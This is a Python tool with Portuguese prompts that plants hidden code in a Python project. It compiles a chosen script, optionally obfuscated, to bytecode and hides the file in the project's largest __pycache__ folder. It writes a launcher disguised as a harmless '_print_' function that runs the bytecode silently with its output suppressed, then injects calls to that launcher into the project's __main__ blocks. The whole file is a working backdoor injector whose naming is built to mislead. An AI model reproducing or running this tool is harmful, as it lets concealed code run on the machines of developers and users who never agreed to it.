import py_compile
import os
import shutil
import subprocess
from pystyle import Colors, Colorate, Center, Anime, System, Write
import re
import threading
import itertools
import time
from tabulate import tabulate

#______________________________________________ import Func

from func.find_largest_pycache import find_largest_pycache
from func.menu_builder import menu_builder
from func.print_intro import print_intro
from func.banner_intro import banner_intro
from func.move_pyc_to_largest_pycache import move_pyc_to_largest_pycache

#______________________________________________ import Func






done = False

def loading_animation():
    for c in itertools.cycle(['|', '/', '-', '\\']):
        if done:
            break
        Write.Print(f'\r[{c}] Compilando', Colors.red_to_yellow, interval=0)
        time.sleep(0.1)
    Write.Print('\r[+] Compilação Concluida!', Colors.red_to_yellow, interval=0)


def compile_python_file(file_path):
    global done
    done = False
    
    if not os.path.isfile(file_path):
        Write.Print(f"[e] Erro: Arquivo não encontrado: {file_path}\n", Colors.red_to_yellow, interval=0)
        return None

    if not file_path.endswith(('.py', '.pyw')):
        Write.Print("[e] Erro: O arquivo deve ter a extensão .py ou .pyw\n", Colors.red_to_yellow, interval=0)
        return None

    try:
        compiled_file_path = file_path + 'c' if file_path.endswith('.py') else file_path[:-1] + 'c'
        
        loading_thread = threading.Thread(target=loading_animation)
        loading_thread.start()
        
        py_compile.compile(file_path, cfile=compiled_file_path, dfile=compiled_file_path, optimize=2)
        
        start_time = time.time()
        timeout = 60  #  -================= Timeot :: Defalt 60

        while not os.path.isfile(compiled_file_path):
            if time.time() - start_time > timeout:
                done = True
                loading_thread.join()
                Write.Print(f"[e] Tempo limite atingido. Arquivo compilado não encontrado: {compiled_file_path}\n", Colors.red_to_yellow, interval=0)
                return None
            time.sleep(0.1)
        done = True
        loading_thread.join()
        Write.Print(f"\n[+] Arquivo compilado com sucesso: {compiled_file_path}\n", Colors.red_to_yellow, interval=0)
        return compiled_file_path
    except Exception as e:
        done = True
        loading_thread.join()
        Write.Print(f"[e] Ocorreu um erro ao compilar o arquivo: {e}\n", Colors.red_to_yellow, interval=0)
        return None



def create_launcher_script(pyc_path):
    current_dir = os.path.dirname(pyc_path)
    parent_dir = os.path.abspath(os.path.join(current_dir, os.pardir))
    launcher_path = os.path.join(parent_dir, "launcher.py")
    
    with open(launcher_path, 'w', encoding='utf-8') as f:
        f.write(f"""
import subprocess as prints
                            
def _print_():
    prints.Popen(['python', r'{pyc_path}'], stdout=prints.PIPE, stderr=prints.PIPE, shell=True)

""")
    Write.Print(f"[+] Arquivo launcher.py criado em: {launcher_path}\n", Colors.red_to_yellow, interval=0)

    return launcher_path

def extract_imports(file_path):
    import_lines = []
    with open(file_path, 'r', encoding='utf-8') as file:
        for line in file:
            if re.match(r'^\s*(import|from)\s+\S+', line):
                import_lines.append(line)
    return ''.join(import_lines)

def obfuscate_file(file_path):
    obfuscated_file_path = "stub.py"
    imports = extract_imports(file_path)
    
    with open('./OBF/obf.py', 'r', encoding='utf-8') as file:
        obf_script = file.read()
    
    obf_script = re.sub(
        r"py_Modules\s*=\s*r'''\s*'''",
        f"py_Modules = r'''\n{imports}\n'''",
        obf_script
    )
    
    with open('./OBF/obf.py', 'w', encoding='utf-8') as file:
        file.write(obf_script)
    
    result = subprocess.run(['python', './OBF/obf.py', file_path, obfuscated_file_path], capture_output=True, text=True)
    if result.returncode != 0:
        Write.Print(f"[e] Erro ao ofuscar o arquivo: {result.stderr}\n\n[Erro] ", Colors.red_to_yellow, interval=0)
        return None
    
    return obfuscated_file_path


def main():
    project_path = Write.Input("[>] Digite o caminho do projeto Python: ", Colors.red_to_yellow, interval=0.0025)
    file_path = Write.Input("[>] Digite o caminho do arquivo .py para compilar: ", Colors.red_to_yellow, interval=0.0025)
    
    should_obfuscate = Write.Input("[?] Deseja ofuscar o arquivo antes de compilar? (s/n): ", Colors.red_to_yellow, interval=0.0025).strip().lower()
    if should_obfuscate == 's':
        original_file_path = file_path
        file_path = obfuscate_file(file_path)
        if file_path is None:
            Write.Print("[!] Ofuscação falhou. Compilação abortada.\n", Colors.red_to_yellow, interval=0)
            return

    largest_pycache = find_largest_pycache(project_path)
    compiled_file_path = compile_python_file(file_path)
    
    if should_obfuscate == 's' and compiled_file_path:
        base_name = os.path.basename(original_file_path)
        if base_name.endswith('.pyw'):
            base_name = base_name[:-1]
        final_pyc_path = compiled_file_path.replace('stub.pyc', base_name + 'c')
        os.rename(compiled_file_path, final_pyc_path)
    else:
        final_pyc_path = compiled_file_path

    if final_pyc_path is None:
        return
    
    moved_pyc_path = move_pyc_to_largest_pycache(final_pyc_path, largest_pycache)
    if moved_pyc_path:
        launcher_path = create_launcher_script(moved_pyc_path)
        if launcher_path is not None:
            insert_print_function(project_path, launcher_path)



def update_imports_for_print_function(file_paths, launcher_path):
    if not all(isinstance(path, str) for path in file_paths):
        raise ValueError("file_paths deve ser uma lista de caminhos de arquivos em formato de string.")
    
    launcher_dir = os.path.dirname(launcher_path)
    common_path = os.path.commonpath(file_paths)
    if not common_path:
        raise ValueError("Não foi possível determinar um caminho comum entre os arquivos.")
    
    relative_path = os.path.relpath(launcher_dir, common_path)
    module_path = os.path.join(relative_path, 'launcher').replace(os.sep, '.').strip('.')
    
    for file_path in file_paths:
        with open(file_path, 'r+', encoding='utf-8') as f:
            content = f.readlines()
            existing_imports = any(re.match(r'^\s*from\s+.*\s+import\s+_print_', line) for line in content)
            
            if not existing_imports:
                content.insert(0, f"from {module_path} import _print_\n")
                f.seek(0)
                f.writelines(content)
                f.truncate()
                Write.Print(f"[+] Importação para _print_() adicionada no arquivo: {file_path}", Colors.red_to_yellow, interval=0)

def insert_print_function(project_path, launcher_path):
    files_to_update = []

    for root, dirs, files in os.walk(project_path):
        for file in files:
            if file.endswith('.py'):
                file_path = os.path.join(root, file)
                with open(file_path, 'r+', encoding='utf-8') as f:
                    content = f.readlines()
                    matches = []
                    for i, line in enumerate(content):
                        if re.match(r'^\s*if\s+__name__\s*==\s*[\'"]__main__[\'"]\s*:', line):
                            indent = ' ' * (len(line) - len(line.lstrip()))
                            matches.append((i, indent))
                    
                    if matches:
                        files_to_update.append((file_path, matches))

    if not files_to_update:
        Write.Print("[!] Não foi encontrado 'if __name__ == \"__main__\":' em nenhum arquivo do projeto.\n", Colors.red_to_yellow, interval=0)
        return
    
    if len(files_to_update) == 1:
        file_path, matches = files_to_update[0]
        with open(file_path, 'r+', encoding='utf-8') as f:
            content = f.readlines()
            for i, indent in matches:
                content.insert(i + 1, f"{indent}    _print_()\n")
            f.seek(0)
            f.writelines(content)
            f.truncate()
        Write.Print(f"[+] Chamada _print_() adicionada no arquivo: {file_path}\n", Colors.red_to_yellow, interval=0)
    else:
        Write.Print("\n[!] Encontrados arquivos com 'if __name__ == \"__main__\":':\n\n", Colors.red_to_yellow, interval=0)
        table_data = []
        for idx, (file_path, matches) in enumerate(files_to_update):
            for i, indent in matches:
                table_data.append([idx + 1, file_path, i + 1])
        
        table_headers = ["# ", "Arquivo", "Linha"]
        Write.Print(tabulate(table_data, headers=table_headers, tablefmt='grid'), Colors.red_to_yellow, interval=0)
        
        user_input = Write.Input("\n\n[>] Digite o número do arquivo para adicionar _print_() ou 'all' para todos ou uma lista separada por vírgula (ex: 1,2): ", Colors.red_to_yellow, interval=0.0025).strip()

        if user_input.lower() == 'all':
            for file_path, matches in files_to_update:
                with open(file_path, 'r+', encoding='utf-8') as f:
                    content = f.readlines()
                    for i, indent in matches:
                        content.insert(i + 1, f"{indent}    _print_()\n")
                    f.seek(0)
                    f.writelines(content)
                    f.truncate()
            Write.Print("[+] Chamada _print_() adicionada a todos os arquivos.\n", Colors.red_to_yellow, interval=0)
        else:
            try:
                selected_indices = list(map(int, user_input.split(',')))
                selected_files = [files_to_update[i - 1] for i in selected_indices if 1 <= i <= len(files_to_update)]
            except ValueError:
                Write.Print("[e] Entrada inválida. Por favor, insira números válidos.\n", Colors.red_to_yellow, interval=0)
                return
            
            if not selected_files:
                Write.Print("[!] Nenhum arquivo válido selecionado.\n", Colors.red_to_yellow, interval=0)
                return
            
            for file_path, matches in selected_files:
                with open(file_path, 'r+', encoding='utf-8') as f:
                    content = f.readlines()
                    for i, indent in matches:
                        content.insert(i + 1, f"{indent}    _print_()\n")
                    f.seek(0)
                    f.writelines(content)
                    f.truncate()
                Write.Print(f"[+] Chamada _print_() adicionada no arquivo: {file_path}\n", Colors.red_to_yellow, interval=0)
    
    update_imports_for_print_function([file_path for file_path, _ in files_to_update], launcher_path)

    
if __name__ == "__main__":
    menu_builder()
    print_intro()
    banner_intro()
    main()